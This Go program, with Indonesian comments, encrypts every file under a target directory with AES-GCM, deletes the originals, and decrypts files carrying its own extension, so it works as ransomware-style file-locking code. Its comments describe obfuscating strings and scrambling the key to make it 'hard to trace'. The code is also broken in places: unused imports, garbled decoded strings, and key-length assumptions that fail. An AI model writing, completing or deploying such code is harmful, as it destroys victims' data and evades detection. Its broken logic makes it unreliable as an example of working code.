package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

// Random string encoding untuk obfuscasi lebih lanjut
func decodeString(s string) string {
	r := ""
	for _, c := range s {
		r += string(c - 3) // Menggunakan Caesar cipher sederhana sebagai contoh
	}
	return r
}

func encFile(path string, gcm cipher.AEAD) {
	original, err := os.ReadFile(path)
	if err != nil {
		return
	}

	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)

	encrypted := gcm.Seal(nonce, nonce, original, nil)

	os.WriteFile(path+decodeString("_hqc"), encrypted, 0666)
	os.Remove(path)
}

func decFile(path string, gcm cipher.AEAD) {
	encrypted, err := os.ReadFile(path)
	if err != nil {
		return
	}

	nonce := encrypted[:gcm.NonceSize()]
	encrypted = encrypted[gcm.NonceSize():]
	original, err := gcm.Open(nil, nonce, encrypted, nil)
	if err != nil {
		return
	}

	os.WriteFile(path[:len(path)-4], original, 0666)
	os.Remove(path)
}

func main() {
	fmt.Print("Masukkan passphrase: ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	passphrase := scanner.Text()

	// Mengacak urutan kunci agar sulit dilacak
	key := []byte(passphrase)
	for i := range key {
		key[i] ^= 0xAA // XOR sederhana
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return
	}

	filepath.Walk(decodeString("03jh/home"), func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			if strings.HasSuffix(path, decodeString("_hqc")) {
				decFile(path, gcm)
			} else {
				encFile(path, gcm)
			}
		}
		return nil
	})
}
